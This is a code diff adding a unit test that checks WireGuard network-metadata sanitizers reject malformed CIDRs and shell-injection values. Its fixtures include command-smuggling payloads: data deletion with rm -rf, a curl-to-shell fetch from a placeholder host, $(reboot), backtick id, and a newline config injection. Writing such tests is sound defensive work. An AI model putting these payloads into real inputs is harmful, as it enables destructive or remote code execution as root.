@@ -88,6 +88,35 @@ test("normalize and sanitize metadata keep the canonical wireguard vocabulary", 
 	);
 });
 
+test("network metadata rejects shell-injection and malformed CIDR values", () => {
+	// Network fields flow into `ip route add <net>` PostUp shell strings executed
+	// as root, so anything that isn't a clean IPv4/IPv6 address or CIDR is dropped.
+	const link = sanitizeLinkMetadata({
+		type: "site-to-site",
+		exportedNetworks: [
+			"10.0.0.0/24", // valid — kept
+			"10.0.0.0/24; rm -rf /etc/wireguard", // injection — dropped
+			"10.0.0.0/24 || curl evil|sh", // injection — dropped
+			"$(reboot)", // injection — dropped
+			"`id`", // injection — dropped
+			"-x", // flag injection — dropped
+			"999.1.1.1/24", // octet > 255 — dropped
+			"fd00::/64", // valid IPv6 — kept
+		],
+		importedNetworks: ["192.168.50.0/24", "not a cidr"],
+	});
+	assert.deepEqual(link.exportedNetworks, ["10.0.0.0/24", "fd00::/64"]);
+	assert.deepEqual(link.importedNetworks, ["192.168.50.0/24"]);
+
+	const iface = sanitizeInterfaceMetadata({
+		exportedNetworks: ["10.10.0.0/24", "10.10.0.0/24\nPostUp = id"],
+		importedNetworks: ["192.168.60.0/24"],
+		routeTargets: ["192.168.60.0/24", "; touch /tmp/pwned"],
+	});
+	assert.deepEqual(iface.exportedNetworks, ["10.10.0.0/24"]);
+	assert.deepEqual(iface.routeTargets, ["192.168.60.0/24"]);
+});
+
 test("classifyLinkType keeps single-network wg0 peers in the client bucket", () => {
 	assert.equal(classifyLinkType(["192.168.50.0/24"], "wg0"), "client");
 	assert.equal(classifyLinkType(["192.168.50.10/32"], "wg0"), "client");
